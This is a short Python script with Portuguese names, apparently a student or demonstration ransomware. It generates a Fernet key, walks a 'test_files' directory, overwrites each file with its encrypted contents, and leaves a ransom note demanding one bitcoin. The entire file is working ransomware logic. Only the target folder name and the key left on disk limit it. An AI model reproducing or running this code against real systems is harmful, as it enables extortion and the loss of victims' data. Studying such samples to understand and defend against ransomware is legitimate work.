from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#Carregar chave
def carregarChave():
    return open ("chave.key", "rb").read()

# Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados =file.read()
    dados_encriptados= f.encrypt(dados)
    with open (arquivo, "wb") as file:
        file.write(dados_encriptados)


def encontrarArquivo(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ran.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criarMensagemResgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados\n")
        f.write("Envie 1 bitcoin para .... ")
        f.write("Depois disso, enviaremos a chave de resgate")


def main():
    gerar_chave()
    chave = carregarChave()
    arquivos = encontrarArquivo("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criarMensagemResgate()
    print("Ransoware executado, arquivos criptografados")


if __name__=="__main__":
    main()


